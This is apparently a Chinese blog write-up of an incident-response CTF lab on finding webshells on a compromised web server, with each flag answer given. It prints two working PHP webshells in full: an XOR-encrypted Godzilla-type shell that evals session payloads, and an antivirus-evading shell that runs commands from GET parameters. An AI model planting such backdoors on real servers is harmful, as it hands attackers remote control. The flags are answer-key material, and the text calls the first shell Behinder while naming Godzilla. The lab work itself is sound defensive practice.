# 第一章-应急响应Webshell查杀

  
  
&lt;!--more--&gt;  
任务要求  
	1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}  
	2.黑客使用的什么工具的shell github地址的md5 flag{md5}  
	3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx  
	4.黑客免杀马完整路径 md5 flag{md5}  
连上靶机之后，利用`tar`命令，压缩网站源码  
`tar -zcvf html.tar.gz /var/www/html`  
在线查杀网站进行查杀  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401312145880.png)  
在`/var/www/html/include/gz.php`文件下，发现第一个`flag`  
```bash  
root@ip-10-0-10-3:/var/www/html# cat /var/www/html/include/gz.php  
&lt;?php  
@session_start();  
@set_time_limit(0);  
@error_reporting(0);  
function encode($D,$K){  
    for($i=0;$i&lt;strlen($D);$i&#43;&#43;) {  
        $c = $K[$i&#43;1&amp;15];  
        $D[$i] = $D[$i]^$c;  
    }  
    return $D;  
}  
//027ccd04-5065-48b6-a32d-77c704a5e26d  
$payloadName=&#39;payload&#39;;  
$key=&#39;3c6e0b8a9c15224a&#39;;  
$data=file_get_contents(&#34;php://input&#34;);  
if ($data!==false){  
    $data=encode($data,$key);  
    if (isset($_SESSION[$payloadName])){  
        $payload=encode($_SESSION[$payloadName],$key);  
        if (strpos($payload,&#34;getBasicsInfo&#34;)===false){  
            $payload=encode($payload,$key);  
        }  
                eval($payload);  
        echo encode(@run($data),$key);  
    }else{  
        if (strpos($data,&#34;getBasicsInfo&#34;)!==false){  
            $_SESSION[$payloadName]=encode($data,$key);  
        }  
    }  
}  
  
```  
`flag{027ccd04-5065-48b6-a32d-77c704a5e26d}`  
很明显是一个冰蝎马，找到 github地址进行提交  
```bash  
f10wers13eicheng@MacBookPro [21时41分00秒] [~/Desktop]   
-&gt; % md5 -s &#39;https://github.com/BeichenDream/Godzilla&#39;  
MD5 (&#34;https://github.com/BeichenDream/Godzilla&#34;) = 39392de3218c333f794befef07ac9257  
```  
`flag{39392de3218c333f794befef07ac9257}`  
第三个 flag 是隐藏shell文件的路径`/var/www/html/include/Db/.Mysqli.php`  
```bash  
f10wers13eicheng@MacBookPro [21时39分52秒] [~/Desktop]   
-&gt; % md5 -s &#39;/var/www/html/include/Db/.Mysqli.php&#39;    
MD5 (&#34;/var/www/html/include/Db/.Mysqli.php&#34;) = aebac0e58cd6c5fad1695ee4d1ac1919  
```  
第四个 flag 为免杀马的路径，在河马查杀里边可以注意到一个特殊的  
`机器学习检测为webshell`，进行查看  
```bash  
root@ip-10-0-10-3:/var/www/html# cat /var/www/html/wap/top.php  
&lt;?php  
  
$key = &#34;password&#34;;  
  
//ERsDHgEUC1hI  
$fun = base64_decode($_GET[&#39;func&#39;]);  
for($i=0;$i&lt;strlen($fun);$i&#43;&#43;){  
    $fun[$i] = $fun[$i]^$key[$i&#43;1&amp;7];  
}  
$a = &#34;a&#34;;  
$s = &#34;s&#34;;  
$c=$a.$s.$_GET[&#34;func2&#34;];  
$c($fun);  
```  
确实是免杀马  
```bash  
f10wers13eicheng@MacBookPro [21时39分59秒] [~/Desktop]   
-&gt; % md5 -s &#39;/var/www/html/wap/top.php&#39;             
MD5 (&#34;/var/www/html/wap/top.php&#34;) = eeff2eabfd9b7a6d26fc1a53d3f7d1de  
```  
`flag{eeff2eabfd9b7a6d26fc1a53d3f7d1de}`  

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/  

